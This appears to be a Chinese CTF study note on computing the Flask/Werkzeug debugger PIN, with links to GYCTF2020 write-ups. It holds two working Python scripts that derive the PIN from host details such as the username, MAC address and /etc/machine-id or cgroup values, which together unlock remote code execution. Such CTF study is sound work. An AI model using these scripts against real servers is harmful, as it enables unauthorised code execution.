# 文章
[关于ctf中flask算pin总结_丨Arcueid丨的博客-CSDN博客](https://blog.csdn.net/qq_35782055/article/details/129126825) (最新版)<br />[Flask debug pin安全问题 - 先知社区](https://xz.aliyun.com/t/2553#toc-1)<br />[Flask debug pin安全问题 - 先知社区.pdf](https://www.yuque.com/attachments/yuque/0/2023/pdf/25358086/1688534177954-3bc10400-d2d5-45f1-a439-8f3510719393.pdf)
# 例题WP
[[GYCTF2020]FlaskApp](https://mayi077.gitee.io/2020/04/17/GYCTF2020-FlaskApp/)<br />[记一次Flask模板注入学习 [GYCTF2020]FlaskApp - seven昔年 - 博客园](https://www.cnblogs.com/MisakaYuii-Z/p/12407760.html)
# docker环境下的machine-id
 假如是Docker机, 那么为 `/proc/self/cgroup` docker行
# 算PIN码脚本
```python
import hashlib
from itertools import chain
probably_public_bits = [
    'kingkk',# username
    'flask.app',# modname
    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/home/kingkk/.local/lib/python3.5/site-packages/flask/app.py' # getattr(mod, '__file__', None),
]

private_bits = [
    '52242498922',# str(uuid.getnode()),  /sys/class/net/ens33/address
    '19949f18ce36422da1402b3e3fe53008'# get_machine_id(), /etc/machine-id
]

h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
```
```plsql
import hashlib
from itertools import chain
probably_public_bits = [
    'root',
    'flask.app',
    'Flask',
    '/usr/local/lib/python3.10/site-packages/flask/app.py'
]

private_bits = [
    '16415777110439',
    '96cec10d3d9307792745ec3b85c89620docker-9dfaf327e52efc8b58e760d930ecd6142e2e23db948a19156c9425339113a588.scope'# get_machine_id(), /etc/machine-id  /proc/sys/kernel/random/boot_id

]

h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode("utf-8")
    h.update(bit)
h.update(b"cookiesalt")

cookie_name = f"__wzd{h.hexdigest()[:20]}"

# If we need to generate a pin we salt it a bit more so that we don't
# end up with the same value and generate out 9 digits
num = None
if num is None:
    h.update(b"pinsalt")
    num = f"{int(h.hexdigest(), 16):09d}"[:9]

# Format the pincode in groups of digits for easier remembering if
# we don't have a result yet.
rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = "-".join(
                num[x : x + group_size].rjust(group_size, "0")
                for x in range(0, len(num), group_size)
            )
            break
    else:
        rv = num

print(rv)

```
